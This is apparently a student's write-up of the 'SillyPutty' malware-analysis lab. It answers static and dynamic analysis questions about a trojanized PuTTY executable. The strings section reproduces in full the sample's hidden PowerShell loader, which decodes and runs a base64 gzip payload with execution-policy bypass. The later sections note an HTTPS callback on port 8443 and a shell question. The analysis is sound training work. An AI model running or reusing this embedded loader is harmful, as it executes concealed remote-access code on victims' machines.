# Challenge-SillyPutty

Hello Analyst,

The help desk has received a few calls from different IT admins regarding the attached program.They say that they've been using this program with no problems until recently. Now, it's crashing randomly and popping up blue windows when its run. I don't like the sound of that. Do your thing!

## Objective
Perform basic static and basic dynamic analysis on this malware sample and extract facts about the malware's behavior. Answer the challenge quesitons below. If you get stuck, the `answers/` directroy has the answers to the challenge.

## Tools
Basic Static:
- File hashes
- VirusTotal
- FLOSS
- PEStudio
- PEView

Basic Dynamic Analysis
- Wireshark
- Inetsim
- Netcat
- TCPView
- Procmon

### Basic Static Analysis Questions:
---

- What is the SHA256 hash of the sample? <br>
0c82e654c09c8fd9fdf4899718efa37670974c9eec5a8fc18a167f93cea6ee83
<br>
---
- What architecture is this binary? <br>
Win32 EXE
<br>
---
- Are there any results from submitting the SHA256 hash to VirusTotal??<br>
Yes <br>
![](/pics/Virus_Total.png)
---
- Describe the results of pulling the strings from this binary. Record and describe any strings that are potentially interesting. Can any interesting information be extracted from the strings?<br>
**Software\SimonTatham\PuTTY <br>
	winadj@putty.projects.tartarus.org <br>
	simple@putty.projects.tartarus.org <br>
	curve25519-sha256@libssh.org <br>
	-sshrawlog <br>
	https://www.chiark.greenend.org.uk/~sgtatham/putty/ <br>
	13.0.0 (https://github.com/llvm/llvm-project/ ab5ee342b92b4661cfec3cdd647c9a5c18e346dd) <br>

	powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yUlypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGFuCvfgCVSroAvw4DIf4D3XnKk25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUjmWA06/Ztgg5Vp2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFTope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHwd7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRmaKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+FvKJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCktlcWPiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WIGf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQJhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"** 
    
    **We can see path, some urls and i think a powershell payload.**
---
- Describe the results of inspecting the IAT for this binary. Are there any imports worth noting?

There are many imports inside this sample but interesting ones for me those import
![](/pics/kernelAPI.png)

these KERNEL32.dll imports look like this program search for a file and create one and delete also one. <br>
![](/pics/shellAPI.png) <br>

This import tell us that this program doing something to some file <br>
![](/pics/shell.png) <br>
![](/pics/userAPI.png)

These one i feel that this program has some keylogger capabilities.
---
- Is it likely that this binary is packed?
No this binary is not packed.
---

### Basic Dynamic Analysis
 - Describe initial detonation. Are there any notable occurances at first detonation? Without internet simulation? With internet simulation?
 When we run this binary a powershell prompt appear for a second and disappear. and then the program pop up a window.
 ![](/pics/run_withoutInetsim.png)
 With internet we find a same thing so let's go to next phase.
 --- 
 - From the host-based indicators perspective, what is the main payload that is initiated at detonation? What tool can you use to identify this?
 If we look at procmon tree view we will find that putty spwans powershell process as child process.
 ![](/pics/powershell_process.png)
 and if we look at stings from basic static we will find a powershell payload and it's try to compressing something. If we take a base64 stream and decode it in remnux we will find that it outs a compress file.
 ![](/pics/compressed_file.png)
 If we decompress it we will find a fully script.
 ![](/pics/Script.png)
 ---
 - What is the DNS record that is queried at detonation? <br>
 ![](/pics/DNS_record.png)
 
 ---
 - What is the callback port number at detonation? <br>
 8443
 ---
 - What is the callback protocol at detonation? <br>
 HTTPS
 ---
 - How can you use host-based telemetry to identify the DNS record, port, and protocol?
 ---
 - Attempt to get the binary to initiate a shell on the localhost. Does a shell spawn? What is needed for a shell to spawn?